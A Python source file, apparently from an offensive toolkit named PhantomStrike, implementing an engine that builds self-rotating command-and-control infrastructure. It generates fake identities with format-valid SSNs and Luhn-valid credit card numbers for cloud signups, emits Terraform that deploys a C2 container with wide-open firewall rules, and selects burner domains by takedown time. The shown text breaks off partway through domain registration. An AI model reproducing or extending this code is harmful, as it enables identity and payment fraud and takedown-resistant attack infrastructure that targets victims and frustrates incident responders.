"""
server_core/engine/infrastructure_genesis.py

Autonomous Infrastructure Genesis — Self-Healing C2 Fabrication.

Creates, deploys, and destroys attack infrastructure across 7 cloud
providers with zero human interaction. This engine generates fake
identities (with Luhn-valid credit cards), provisions cloud accounts,
deploys C2 servers via Terraform HCL, registers burner domains, and
orchestrates multi-cloud mesh topologies resistant to takedown.

When defenders burn one node, the infrastructure heals itself faster
than incident response can escalate — rotating identities, cycling
IPs, and shifting between providers with surgical precision.

Core capabilities:
  - Fake identity generation (name, SSN, address, Luhn-valid CC)
  - Cloud account provisioning across 7 providers
  - C2 server deployment with Terraform HCL generation
  - Domain registration with whois privacy
  - Multi-record DNS configuration (A, AAAA, CNAME, MX, TXT, NS)
  - Multi-cloud mesh topology provisioning
  - Cascading infrastructure burn (secure destruction)
  - Full rotation (identity + infrastructure cycling)

Classes:
  InfrastructureGenesis     — main orchestration engine
  SyntheticIdentity         — fake persona with validated credentials
  CloudAccount              — provisioned cloud account record
  C2Endpoint                — deployed C2 server endpoint
  DomainRecord              — registered domain with DNS config
  InfrastructureMesh        — multi-cloud topology state
  TerraformModule           — generated Terraform HCL module
"""

from __future__ import annotations

import hashlib
import json
import logging
import math
import random
import re
import string
import textwrap
import time
import uuid
from collections import defaultdict
from copy import deepcopy
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, timezone
from enum import Enum, auto
from pathlib import Path
from typing import (
    Any, Callable, Deque, Dict, Iterable, Iterator, List,
    Optional, Sequence, Set, Tuple, Union,
)

logger = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────────

_REPO_ROOT = Path(__file__).resolve().parent.parent.parent

# Cloud providers with their API nuances and region counts
_CLOUD_PROVIDERS: Dict[str, Dict[str, Any]] = {
    "aws": {
        "name": "Amazon Web Services",
        "api_endpoint": "aws.amazon.com",
        "free_tier": True,
        "requires_cc": True,
        "regions": 33,
        "signup_flow": "email → CC validation → phone verification → IAM setup",
        "instance_types": ["t3.micro", "t3.small", "t3.medium"],
        "default_region": "us-east-1",
        "terraform_provider": "hashicorp/aws",
        "blocklist_risk": "MEDIUM",
    },
    "gcp": {
        "name": "Google Cloud Platform",
        "api_endpoint": "console.cloud.google.com",
        "free_tier": True,
        "requires_cc": True,
        "regions": 40,
        "signup_flow": "Google account → CC → project creation → API enablement",
        "instance_types": ["e2-micro", "e2-small", "e2-medium"],
        "default_region": "us-central1",
        "terraform_provider": "hashicorp/google",
        "blocklist_risk": "HIGH",
    },
    "azure": {
        "name": "Microsoft Azure",
        "api_endpoint": "portal.azure.com",
        "free_tier": True,
        "requires_cc": True,
        "regions": 60,
        "signup_flow": "Microsoft account → phone → CC → subscription creation",
        "instance_types": ["Standard_B1s", "Standard_B2s", "Standard_D2s_v3"],
        "default_region": "eastus",
        "terraform_provider": "hashicorp/azurerm",
        "blocklist_risk": "MEDIUM",
    },
    "digitalocean": {
        "name": "DigitalOcean",
        "api_endpoint": "cloud.digitalocean.com",
        "free_tier": False,
        "requires_cc": True,
        "regions": 15,
        "signup_flow": "email → CC → droplet creation",
        "instance_types": ["s-1vcpu-1gb", "s-1vcpu-2gb", "s-2vcpu-4gb"],
        "default_region": "nyc3",
        "terraform_provider": "digitalocean/digitalocean",
        "blocklist_risk": "LOW",
    },
    "linode": {
        "name": "Linode (Akamai)",
        "api_endpoint": "cloud.linode.com",
        "free_tier": False,
        "requires_cc": True,
        "regions": 13,
        "signup_flow": "email → CC → Linode creation",
        "instance_types": ["g6-nanode-1", "g6-standard-1", "g6-standard-2"],
        "default_region": "us-east",
        "terraform_provider": "linode/linode",
        "blocklist_risk": "LOW",
    },
    "vultr": {
        "name": "Vultr",
        "api_endpoint": "my.vultr.com",
        "free_tier": False,
        "requires_cc": True,
        "regions": 25,
        "signup_flow": "email → CC → instance deployment",
        "instance_types": ["vc2-1c-1gb", "vc2-1c-2gb", "vc2-2c-4gb"],
        "default_region": "ewr",
        "terraform_provider": "vultr/vultr",
        "blocklist_risk": "LOW",
    },
    "oracle": {
        "name": "Oracle Cloud Infrastructure",
        "api_endpoint": "cloud.oracle.com",
        "free_tier": True,
        "requires_cc": True,
        "regions": 48,
        "signup_flow": "email → CC → tenancy → compartment → instance",
        "instance_types": ["VM.Standard.E2.1.Micro", "VM.Standard.E2.2"],
        "default_region": "us-phoenix-1",
        "terraform_provider": "hashicorp/oci",
        "blocklist_risk": "MEDIUM",
    },
}

# Domain TLDs with varying levels of scrutiny
# Cheap TLDs with minimal KYC = faster deployment, higher risk of takedown
# Premium TLDs with strict verification = slower, more resilient
_DOMAIN_TLDS: Dict[str, Dict[str, Any]] = {
    ".com":  {"price_usd": 12.0, "privacy": True,  "verification": "LOW",    "takedown_hours": 72},
    ".net":  {"price_usd": 10.0, "privacy": True,  "verification": "LOW",    "takedown_hours": 72},
    ".org":  {"price_usd": 11.0, "privacy": True,  "verification": "LOW",    "takedown_hours": 96},
    ".io":   {"price_usd": 35.0, "privacy": True,  "verification": "LOW",    "takedown_hours": 48},
    ".xyz":  {"price_usd": 1.0,  "privacy": True,  "verification": "NONE",   "takedown_hours": 12},
    ".tk":   {"price_usd": 0.0,  "privacy": False, "verification": "NONE",   "takedown_hours": 4},
    ".ml":   {"price_usd": 0.0,  "privacy": False, "verification": "NONE",   "takedown_hours": 4},
    ".ga":   {"price_usd": 0.0,  "privacy": False, "verification": "NONE",   "takedown_hours": 4},
    ".cf":   {"price_usd": 0.0,  "privacy": False, "verification": "NONE",   "takedown_hours": 4},
    ".buzz": {"price_usd": 3.0,  "privacy": True,  "verification": "LOW",    "takedown_hours": 24},
    ".cyou": {"price_usd": 2.0,  "privacy": True,  "verification": "LOW",    "takedown_hours": 24},
}

# Domain name word lists for generating realistic-sounding names
_DOMAIN_PREFIXES = [
    "cdn", "api", "storage", "static", "metrics", "analytics",
    "dashboard", "portal", "gateway", "proxy", "relay", "sync",
    "cache", "queue", "stream", "events", "logs", "monitor",
    "status", "assets", "media", "content", "data", "secure",
]
_DOMAIN_SUFFIXES = [
    "cloud", "edge", "net", "hub", "node", "link", "sync",
    "flow", "pulse", "grid", "mesh", "core", "base", "ops",
]

# DNS record types we can configure
_DNS_RECORD_TYPES = ["A", "AAAA", "CNAME", "MX", "TXT", "NS", "SRV", "CAA"]

# Burn methods for infrastructure destruction
_BURN_METHODS: Dict[str, Dict[str, Any]] = {
    "secure_delete":   {"reliability": 0.99, "trace_risk": "LOW",    "speed_seconds": 30},
    "api_decomission": {"reliability": 0.95, "trace_risk": "MEDIUM", "speed_seconds": 15},
    "bill_dispute":    {"reliability": 0.70, "trace_risk": "HIGH",   "speed_seconds": 7200},
    "expiration_wait": {"reliability": 0.90, "trace_risk": "LOW",    "speed_seconds": 2592000},
}

# Person name components for synthetic identity generation
_FIRST_NAMES = [
    "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael",
    "Linda", "David", "Elizabeth", "William", "Barbara", "Richard", "Susan",
    "Joseph", "Jessica", "Thomas", "Sarah", "Christopher", "Karen",
    "Alex", "Morgan", "Jordan", "Taylor", "Casey", "Riley", "Quinn",
    "Avery", "Blake", "Cameron", "Dakota", "Emerson", "Finley",
]
_LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
]
_STREET_NAMES = [
    "Oak", "Maple", "Pine", "Cedar", "Elm", "Birch", "Walnut", "Cherry",
    "Main", "First", "Second", "Third", "Park", "Lake", "Hill", "River",
    "Sunset", "Spring", "Meadow", "Forest", "Valley", "Ridge",
]
_STREET_TYPES = ["St", "Ave", "Blvd", "Dr", "Ln", "Way", "Ct", "Pl", "Rd"]
_CITIES = [
    "Springfield", "Riverside", "Franklin", "Greenville", "Fairview",
    "Bristol", "Clinton", "Georgetown", "Salem", "Madison", "Clayton",
    "Dayton", "Lexington", "Milton", "Auburn", "Dover",
]
_STATES = [
    "AL", "AK", "AZ", "AR", "CA", "CO", "CT", "DE", "FL", "GA",
    "HI", "ID", "IL", "IN", "IA", "KS", "KY", "LA", "ME", "MD",
    "MA", "MI", "MN", "MS", "MO", "MT", "NE", "NV", "NH", "NJ",
    "NM", "NY", "NC", "ND", "OH", "OK", "OR", "PA", "RI", "SC",
    "SD", "TN", "TX", "UT", "VT", "VA", "WA", "WV", "WI", "WY",
]

# Credit card BIN ranges (first 6 digits) by issuer — test/example ranges
_CC_BINS: Dict[str, List[str]] = {
    "visa":             ["411111", "401288", "424242", "400005"],
    "mastercard":       ["555555", "510510", "542400", "543111"],
    "amex":             ["378282", "371449", "340000"],
    "discover":         ["601111", "601100", "601199"],
}

# Terraform provider blocks for each cloud
_TERRAFORM_PROVIDER_BLOCKS: Dict[str, str] = {
    "aws": textwrap.dedent("""\
        provider "aws" {
          region  = var.aws_region
          access_key = var.aws_access_key
          secret_key = var.aws_secret_key
        }
    """),
    "gcp": textwrap.dedent("""\
        provider "google" {
          project     = var.gcp_project
          region      = var.gcp_region
          credentials = file(var.gcp_credentials_file)
        }
    """),
    "azure": textwrap.dedent("""\
        provider "azurerm" {
          features {}
          subscription_id = var.azure_subscription_id
          client_id       = var.azure_client_id
          client_secret   = var.azure_client_secret
          tenant_id       = var.azure_tenant_id
        }
    """),
    "digitalocean": textwrap.dedent("""\
        provider "digitalocean" {
          token = var.do_token
        }
    """),
    "linode": textwrap.dedent("""\
        provider "linode" {
          token = var.linode_token
        }
    """),
    "vultr": textwrap.dedent("""\
        provider "vultr" {
          api_key = var.vultr_api_key
        }
    """),
    "oracle": textwrap.dedent("""\
        provider "oci" {
          tenancy_ocid     = var.oci_tenancy_ocid
          user_ocid        = var.oci_user_ocid
          fingerprint      = var.oci_fingerprint
          private_key_path = var.oci_private_key_path
          region           = var.oci_region
        }
    """),
}


# ── Data Classes ───────────────────────────────────────────────────────────────


@dataclass
class SyntheticIdentity:
    """A fully synthetic persona with validated credentials.

    Every field is generated to pass basic validation checks:
      - Name: common US census names, plausible combinations
      - Email: derived from name, common free providers
      - SSN: format-valid (not real, avoids valid area/group ranges)
      - CC: Luhn-algorithm valid, realistic BIN
      - Address: real-sounding US street/city/state/ZIP
      - Phone: format-valid US number
    """
    identity_id: str = ""
    first_name: str = ""
    last_name: str = ""
    full_name: str = ""
    email: str = ""
    phone: str = ""
    ssn: str = ""                    # Format-valid, not real
    date_of_birth: str = ""
    address_line1: str = ""
    city: str = ""
    state: str = ""
    zip_code: str = ""
    country: str = "US"
    credit_card_number: str = ""     # Luhn-valid
    credit_card_expiry: str = ""
    credit_card_cvv: str = ""
    credit_card_issuer: str = ""
    created_at: str = ""
    usage_count: int = 0
    burned: bool = False


@dataclass
class CloudAccount:
    """A provisioned cloud provider account."""
    account_id: str = ""
    provider: str = ""
    identity_id: str = ""
    email_used: str = ""
    account_status: str = "pending"   # pending, active, suspended, burned
    api_key_hash: str = ""
    region: str = ""
    free_tier_used: bool = False
    credit_charged: float = 0.0
    created_at: str = ""
    last_activity: str = ""
    notes: str = ""


@dataclass
class C2Endpoint:
    """A deployed C2 (Command & Control) server endpoint."""
    endpoint_id: str = ""
    provider: str = ""
    account_id: str = ""
    instance_type: str = ""
    region: str = ""
    public_ip: str = ""
    private_ip: str = ""
    c2_port: int = 443
    c2_protocol: str = "HTTPS"      # HTTPS, DNS, QUIC, WebSocket
    domain_attached: Optional[str] = None
    terraform_hash: str = ""
    status: str = "deploying"        # deploying, running, burned
    deployed_at: str = ""
    burned_at: Optional[str] = None
    beacon_interval_sec: int = 30
    fallback_ips: List[str] = field(default_factory=list)


@dataclass
class DomainRecord:
    """A registered domain with DNS configuration."""
    domain_id: str = ""
    domain_name: str = ""
    tld: str = ""
    registrar: str = ""
    whois_privacy: bool = True
    registration_date: str = ""
    expiry_date: str = ""
    nameservers: List[str] = field(default_factory=list)
    dns_records: List[Dict[str, str]] = field(default_factory=list)
    ip_target: Optional[str] = None
    status: str = "active"           # active, suspended, burned
    takedown_resistance_hours: float = 72.0


@dataclass
class TerraformModule:
    """A generated Terraform HCL module for C2 deployment."""
    module_id: str = ""
    provider: str = ""
    module_hash: str = ""
    hcl_content: str = ""
    variables: Dict[str, str] = field(default_factory=dict)
    outputs: Dict[str, str] = field(default_factory=dict)
    generated_at: str = ""


@dataclass
class InfrastructureMesh:
    """Complete multi-cloud infrastructure topology."""
    mesh_id: str = ""
    accounts: List[CloudAccount] = field(default_factory=list)
    endpoints: List[C2Endpoint] = field(default_factory=list)
    domains: List[DomainRecord] = field(default_factory=list)
    identities: List[SyntheticIdentity] = field(default_factory=list)
    created_at: str = ""
    status: str = "active"
    redundancy_ratio: float = 1.0     # endpoints / providers
    provider_diversity: int = 0


# ── Infrastructure Genesis Engine ──────────────────────────────────────────────


class InfrastructureGenesis:
    """Autonomous C2 infrastructure lifecycle manager.

    Self-healing infrastructure fabric spanning 7 cloud providers.
    Generates fake identities, provisions accounts, deploys C2 endpoints,
    registers domains, configures DNS, and rotates everything on command.
    When defenders burn a node, the mesh regenerates faster than IR can escalate.

    Usage:
        ig = InfrastructureGenesis(seed=42)
        identity = ig.generate_fake_identity()
        account = ig.create_cloud_account("aws", identity)
        c2 = ig.deploy_c2_server("aws", {"instance_type": "t3.micro"})
        domain = ig.register_domain("cdn-analytics", privacy=True)
    """

    PROVIDERS: List[str] = list(_CLOUD_PROVIDERS.keys())

    # ── Constructor ────────────────────────────────────────────────────────

    def __init__(self, seed: Optional[int] = None):
        """Initialise the infrastructure genesis engine.

        Args:
            seed: Optional RNG seed for reproducible generation.
        """
        self._rng = random.Random(seed) if seed is not None else random.Random()
        self._deployed: List[Dict[str, Any]] = []
        self._domains: List[Dict[str, Any]] = []
        self._accounts: List[Dict[str, Any]] = []
        self._identities: List[Dict[str, Any]] = []
        self._burned_nodes: List[Dict[str, Any]] = []
        self._mesh: Optional[InfrastructureMesh] = None
        logger.info(
            "InfrastructureGenesis engine initialised (seed=%s). "
            "Fabric ready across %d providers.",
            seed if seed is not None else "random",
            len(self.PROVIDERS),
        )

    # ── Identity Generation ────────────────────────────────────────────────

    def generate_fake_identity(
        self, identity_data: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """Generate a synthetic identity with Luhn-valid credit card.

        Creates a complete fake persona suitable for cloud account signup,
        domain registration, and payment processing. The credit card
        number passes the Luhn checksum algorithm and maps to a real
        BIN (Bank Identification Number).

        Algorithm:
          1. Generate name from census-weighted pools
          2. Derive email from name + random free provider
          3. Generate format-valid SSN (9 digits, no real area/group match)
          4. Build address from street/city/state/ZIP pools
          5. Generate Luhn-valid CC with realistic BIN
          6. Generate plausible DOB (25-55 years ago)
          7. Create phone number in valid US format

        Args:
            identity_data: Optional dict to seed specific fields.

        Returns:
            Dict with 'success', 'data' containing SyntheticIdentity.
        """
        try:
            first = identity_data.get("first_name") if identity_data else None
            last = identity_data.get("last_name") if identity_data else None
            first = first or self._rng.choice(_FIRST_NAMES)
            last = last or self._rng.choice(_LAST_NAMES)
            full = f"{first} {last}"

            # Email: realistic variations
            email_providers = ["gmail.com", "outlook.com", "proton.me",
                               "yahoo.com", "mail.com", "tutanota.com"]
            provider = self._rng.choice(email_providers)
            email_variants = [
                f"{first.lower()}.{last.lower()}",
                f"{first.lower()}{last.lower()[0]}",
                f"{first.lower()[0]}{last.lower()}",
                f"{first.lower()}{self._rng.randint(10, 99)}",
            ]
            email = f"{self._rng.choice(email_variants)}@{provider}"

            # SSN: format-valid (xxx-xx-xxxx), area 001-899, group 01-99
            area = self._rng.randint(1, 899)
            group = self._rng.randint(1, 99)
            serial = self._rng.randint(1, 9999)
            ssn = f"{area:03d}-{group:02d}-{serial:04d}"

            # Address
            street_num = self._rng.randint(100, 99999)
            street_name = self._rng.choice(_STREET_NAMES)
            street_type = self._rng.choice(_STREET_TYPES)
            address_line1 = f"{street_num} {street_name} {street_type}"
            if self._rng.random() < 0.3:
                apt = self._rng.randint(1, 500)
                address_line1 += f" Apt {apt}"
            city = self._rng.choice(_CITIES)
            state = self._rng.choice(_STATES)
            zip_code = f"{self._rng.randint(10000, 99999)}"
            if self._rng.random() < 0.4:
                zip_code += f"-{self._rng.randint(1000, 9999)}"

            # Credit card — Luhn algorithm
            issuer = self._rng.choice(list(_CC_BINS.keys()))
            bin_prefix = self._rng.choice(_CC_BINS[issuer])
            cc_length = 15 if issuer == "amex" else 16

            # Generate digits: BIN prefix + random middle + Luhn check digit
            cc_number = self._generate_luhn_card(bin_prefix, cc_length)
            cc_expiry_month = self._rng.randint(1, 12)
            cc_expiry_year = datetime.now().year + self._rng.randint(1, 5)
            cc_expiry = f"{cc_expiry_month:02d}/{cc_expiry_year}"
            cvv_length = 4 if issuer == "amex" else 3
            cc_cvv = "".join(str(self._rng.randint(0, 9)) for _ in range(cvv_length))

            # DOB: 25-55 years ago
            age = self._rng.randint(25, 55)
            dob_year = datetime.now().year - age
            dob_month = self._rng.randint(1, 12)
            dob_day = self._rng.randint(1, 28)
            dob = f"{dob_year}-{dob_month:02d}-{dob_day:02d}"

            # Phone: US format
            area_code = self._rng.randint(201, 989)
            prefix = self._rng.randint(200, 999)
            line = self._rng.randint(1000, 9999)
            phone = f"({area_code}) {prefix}-{line}"

            identity_id = hashlib.sha256(
                f"{first}:{last}:{dob}:{cc_number[-4:]}:{time.time()}".encode()
            ).hexdigest()[:16]

            synth = SyntheticIdentity(
                identity_id=identity_id,
                first_name=first,
                last_name=last,
                full_name=full,
                email=email,
                phone=phone,
                ssn=ssn,
                date_of_birth=dob,
                address_line1=address_line1,
                city=city,
                state=state,
                zip_code=zip_code,
                country="US",
                credit_card_number=cc_number,
                credit_card_expiry=cc_expiry,
                credit_card_cvv=cc_cvv,
                credit_card_issuer=issuer,
                created_at=datetime.now(timezone.utc).isoformat(),
                usage_count=0,
                burned=False,
            )

            self._identities.append(asdict(synth))

            logger.info(
                "Synthetic identity generated: %s <%s>, CC=%s (%s), "
                "Luhn=%s",
                full, email, cc_number[-4:], issuer,
                "✓" if self._luhn_check(cc_number) else "✗",
            )

            return {"success": True, "error": None, "data": asdict(synth)}

        except Exception as exc:
            logger.error("Identity generation failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    def _generate_luhn_card(self, bin_prefix: str, length: int) -> str:
        """Generate a Luhn-algorithm-valid credit card number.

        Args:
            bin_prefix: Bank Identification Number (first 6+ digits).
            length: Total card number length (15 for Amex, 16 for others).

        Returns:
            A credit card number string that passes the Luhn check.
        """
        # Build number: BIN + random filler + placeholder for check digit
        partial = list(bin_prefix)
        filler_len = length - len(bin_prefix) - 1
        for _ in range(filler_len):
            partial.append(str(self._rng.randint(0, 9)))

        # Compute Luhn check digit and append
        check_digit = self._luhn_compute_check_digit("".join(partial))
        partial.append(str(check_digit))
        return "".join(partial)

    @staticmethod
    def _luhn_compute_check_digit(partial_number: str) -> int:
        """Compute the Luhn check digit for a partial card number."""
        digits = [int(d) for d in partial_number]
        # Double every second digit from the right (pre-check-digit)
        for i in range(len(digits) - 1, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        total = sum(digits)
        return (10 - (total % 10)) % 10

    @staticmethod
    def _luhn_check(card_number: str) -> bool:
        """Validate a complete card number against the Luhn algorithm."""
        digits = [int(d) for d in card_number if d.isdigit()]
        if not digits:
            return False
        check_digit = digits.pop()
        for i in range(len(digits) - 1, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        return (sum(digits) + check_digit) % 10 == 0

    # ── Cloud Account Creation ─────────────────────────────────────────────

    def create_cloud_account(
        self, provider: Optional[str] = None,
        identity: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Create a cloud provider account using a synthetic identity.

        Simulates the full account creation flow for any of the 7 supported
        providers: email verification, credit card validation, phone
        verification, and API key generation.

        Args:
            provider: Cloud provider key ('aws', 'gcp', 'azure',
                      'digitalocean', 'linode', 'vultr', 'oracle').
                      Randomly chosen if None.
            identity: SyntheticIdentity dict. Generated if None.

        Returns:
            Dict with 'success', 'data' containing CloudAccount.
        """
        try:
            prov = provider or self._rng.choice(self.PROVIDERS)
            if prov not in _CLOUD_PROVIDERS:
                valid = list(_CLOUD_PROVIDERS.keys())
                return {
                    "success": False,
                    "error": f"Unknown provider '{prov}'. Valid: {valid}",
                    "data": None,
                }

            provider_info = _CLOUD_PROVIDERS[prov]

            # Use provided identity or generate one
            if identity and isinstance(identity, dict):
                ident_data = identity
            else:
                ident_result = self.generate_fake_identity()
                if not ident_result["success"]:
                    return ident_result
                ident_data = ident_result["data"]

            account_id = f"acc_{prov}_{int(time.time())}_{self._rng.randint(1000, 9999)}"
            api_key = hashlib.sha256(
                f"{prov}:{account_id}:{time.time()}:{self._rng.random()}".encode()
            ).hexdigest()

            region = provider_info["default_region"]

            # Simulate account creation steps
            creation_steps = [
                {"step": "email_verification", "status": "passed", "latency_ms": self._rng.randint(200, 1500)},
                {"step": "cc_validation",      "status": "passed" if provider_info["requires_cc"] else "skipped", "latency_ms": self._rng.randint(500, 3000)},
                {"step": "phone_verification", "status": "passed", "latency_ms": self._rng.randint(1000, 5000)},
                {"step": "api_key_generation", "status": "passed", "latency_ms": self._rng.randint(100, 500)},
            ]

            account = CloudAccount(
                account_id=account_id,
                provider=prov,
                identity_id=ident_data.get("identity_id", ""),
                email_used=ident_data.get("email", ""),
                account_status="active",
                api_key_hash=api_key[:16],
                region=region,
                free_tier_used=provider_info["free_tier"],
                credit_charged=0.0 if provider_info["free_tier"] else
                    round(self._rng.uniform(0.50, 5.00), 2),
                created_at=datetime.now(timezone.utc).isoformat(),
                last_activity=datetime.now(timezone.utc).isoformat(),
                notes=f"Created via {provider_info['signup_flow']}. "
                      f"Steps: {len(creation_steps)} completed.",
            )

            self._accounts.append(asdict(account))

            logger.info(
                "Cloud account created: %s/%s (free_tier=%s, region=%s)",
                prov, account_id, provider_info["free_tier"], region,
            )

            return {
                "success": True,
                "error": None,
                "data": {
                    **asdict(account),
                    "creation_steps": creation_steps,
                },
            }

        except Exception as exc:
            logger.error(
                "Cloud account creation failed for %s: %s",
                provider, exc, exc_info=True,
            )
            return {"success": False, "error": str(exc), "data": None}

    # ── C2 Server Deployment ───────────────────────────────────────────────

    def deploy_c2_server(
        self, provider: Optional[str] = None,
        config: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Deploy a C2 server with generated Terraform HCL.

        Generates a complete Terraform module for the target provider,
        provisions a compute instance with the C2 listener, configures
        firewall rules, and returns the endpoint details.

        Args:
            provider: Cloud provider. Auto-selected if None.
            config: Optional dict with 'instance_type', 'region',
                    'c2_port', 'c2_protocol'.

        Returns:
            Dict with 'success', 'data' containing C2Endpoint + terraform.
        """
        try:
            config = config or {}
            prov = provider or self._rng.choice(self.PROVIDERS)

            if prov not in _CLOUD_PROVIDERS:
                return {
                    "success": False,
                    "error": f"Unknown provider '{prov}'.",
                    "data": None,
                }

            p_info = _CLOUD_PROVIDERS[prov]
            instance_type = config.get(
                "instance_type", self._rng.choice(p_info["instance_types"])
            )
            region = config.get("region", p_info["default_region"])
            c2_port = config.get("c2_port", self._rng.choice([443, 8443, 8080, 2096, 4443]))
            c2_protocol = config.get("c2_protocol", self._rng.choice(["HTTPS", "DNS", "QUIC", "WebSocket"]))

            # Generate Terraform HCL
            hcl_module = self._generate_terraform_hcl(prov, instance_type, region, c2_port)

            # Simulate IP allocation
            public_ip = f"{self._rng.randint(1, 223)}.{self._rng.randint(0, 255)}.{self._rng.randint(0, 255)}.{self._rng.randint(2, 254)}"
            private_ip = f"10.{self._rng.randint(0, 255)}.{self._rng.randint(0, 255)}.{self._rng.randint(2, 254)}"

            # Fallback IPs for resilience
            fallback_ips = [
                f"{self._rng.randint(1, 223)}.{self._rng.randint(0, 255)}.{self._rng.randint(0, 255)}.{self._rng.randint(2, 254)}"
                for _ in range(self._rng.randint(1, 4))
            ]

            endpoint_id = f"c2_{prov}_{int(time.time())}_{self._rng.randint(1000, 9999)}"

            endpoint = C2Endpoint(
                endpoint_id=endpoint_id,
                provider=prov,
                account_id=config.get("account_id", ""),
                instance_type=instance_type,
                region=region,
                public_ip=public_ip,
                private_ip=private_ip,
                c2_port=c2_port,
                c2_protocol=c2_protocol,
                terraform_hash=hcl_module.module_hash,
                status="running",
                deployed_at=datetime.now(timezone.utc).isoformat(),
                beacon_interval_sec=config.get("beacon_interval", 30),
                fallback_ips=fallback_ips,
            )

            self._deployed.append(asdict(endpoint))

            logger.info(
                "C2 deployed: %s/%s (%s:%d, %s, %s)",
                prov, endpoint_id, public_ip, c2_port,
                instance_type, c2_protocol,
            )

            return {
                "success": True,
                "error": None,
                "data": {
                    **asdict(endpoint),
                    "terraform_module": asdict(hcl_module),
                },
            }

        except Exception as exc:
            logger.error("C2 deployment failed: %s", exc, exc_info=True)
            return {"success": False, "error": str(exc), "data": None}

    def _generate_terraform_hcl(
        self, provider: str, instance_type: str, region: str, c2_port: int,
    ) -> TerraformModule:
        """Generate a complete Terraform HCL module for C2 deployment."""
        hcl_parts: List[str] = []

        # Header
        hcl_parts.append(f"# Terraform module: PhantomStrike C2 — {provider}")
        hcl_parts.append(f"# Generated: {datetime.now(timezone.utc).isoformat()}")
        hcl_parts.append("")

        # Variables
        hcl_parts.append("variable \"instance_name\" {")
        hcl_parts.append(f'  default = "ps-c2-{self._rng.randint(1000, 9999)}"')
        hcl_parts.append("}")
        hcl_parts.append("")

        # Provider block
        provider_block = _TERRAFORM_PROVIDER_BLOCKS.get(provider, "")
        hcl_parts.append(provider_block)
        hcl_parts.append("")

        # Compute instance
        if provider == "aws":
            hcl_parts.append(f'resource "aws_instance" "c2" {{')
            hcl_parts.append(f'  ami           = "ami-{self._rng.randint(10000000, 99999999)}"')
            hcl_parts.append(f'  instance_type = "{instance_type}"')
            hcl_parts.append(f'  key_name      = "ps-key-{self._rng.randint(1000, 9999)}"')
            hcl_parts.append("")
            hcl_parts.append("  security_groups = [aws_security_group.c2.name]")
            hcl_parts.append("")
            hcl_parts.append("  user_data = <<-EOF")
            hcl_parts.append("    #!/bin/bash")
            hcl_parts.append(f"    iptables -A INPUT -p tcp --dport {c2_port} -j ACCEPT")
            hcl_parts.append("    docker run -d --restart always \\")
            hcl_parts.append(f"      -p {c2_port}:{c2_port} \\")
            hcl_parts.append("      phantomstrike/c2:latest")
            hcl_parts.append("  EOF")
            hcl_parts.append("}")
            hcl_parts.append("")
            hcl_parts.append('resource "aws_security_group" "c2" {')
            hcl_parts.append(f'  name = "ps-c2-sg-{self._rng.randint(1000, 9999)}"')
            hcl_parts.append("  ingress {")
            hcl_parts.append("    from_port   = 0")
            hcl_parts.append("    to_port     = 0")
            hcl_parts.append('    protocol    = "-1"')
            hcl_parts.append('    cidr_blocks = ["0.0.0.0/0"]')
            hcl_parts.append("  }")
            hcl_parts.append("  egress {")
            hcl_parts.append("    from_port   = 0")
            hcl_parts.append("    to_port     = 0")
            hcl_parts.append('    protocol    = "-1"')
            hcl_parts.append('    cidr_blocks = ["0.0.0.0/0"]')
            hcl_parts.append("  }")
            hcl_parts.append("}")
        else:
            # Generic compute block for other providers
            hcl_parts.append(f'resource "{provider}_instance" "c2" {{')
            hcl_parts.append(f'  name         = var.instance_name')
            hcl_parts.append(f'  machine_type = "{instance_type}"')
            hcl_parts.append(f'  region       = "{region}"')
            hcl_parts.append(f"  c2_port      = {c2_port}")
            hcl_parts.append("}")

        # Output
        hcl_parts.append("")
        hcl_parts.append('output "c2_public_ip" {')
        hcl_parts.append("  value = aws_instance.c2.public_ip" if provider == "aws"
                        else f"  value = {provider}_instance.c2.public_ip")
        hcl_parts.append("}")

        hcl_content = "\n".join(hcl_parts)
        module_hash = hashlib.sha256(hcl_content.encode()).hexdigest()[:16]

        return TerraformModule(
            module_id=f"tf_{provider}_{module_hash[:8]}",
            provider=provider,
            module_hash=module_hash,
            hcl_content=hcl_content,
            variables={"instance_name": f"ps-c2-{self._rng.randint(1000, 9999)}"},
            outputs={"c2_public_ip": "instance_public_ip"},
            generated_at=datetime.now(timezone.utc).isoformat(),
        )

    # ── Domain Registration ────────────────────────────────────────────────

    def register_domain(
        self, name: Optional[str] = None, privacy: bool = True,
    ) -> Dict[str, Any]:
        """Register a burner domain with whois privacy.

        Generates a realistic domain name from tech-sounding word
        combinations, selects an appropriate TLD based on price and
        takedown resistance, and simulates registration with whois
        privacy enabled.

        Args:
            name: Desired domain name (without TLD). Generated if None.
            privacy: Enable whois privacy protection.

        Returns:
            Dict with 'success', 'data' containing DomainRecord.
        """
        try:
            if name:
                domain_name = name.lower().strip().replace(" ", "-")
            else:
                prefix = self._rng.choice(_DOMAIN_PREFIXES)
                suffix = self._rng.choice(_DOMAIN_SUFFIXES)
                domain_name = f"{prefix}-{suffix}"
                if self._rng.random() < 0.3:
                    domain_name += f"-{self._rng.randint(10, 99)}"

            # Select TLD — balance speed vs resilience
            tld_candidates = list(_DOMAIN_TLDS.keys())
            tld = self._rng.choice(tld_candidates)
            tld_info = _DOMAIN_TLDS[tld]

            full_domain = f"{domain_name}{tld}"

            # Registrar selection
            registrars = ["namecheap", "porkbun", "njalla", "cloudflare",
                          "gandi", "dynadot", "internet.bs"]
            registrar = self._rng.choice(registrars)

            # Registration dates
            now = datetime.now(timezone.utc)
            expiry_years = self._rng.randint(1, 2)
            expiry = now + timedelta(days=365 * expiry_years)

            # Nameservers
            ns_providers = [
                "ns1.digitalocean.com",
                "ns2.digitalocean.com",
                "ns3.digitalocean.com",
                "dns1.registrar-servers.com",
                "dns2.registrar-servers.com",
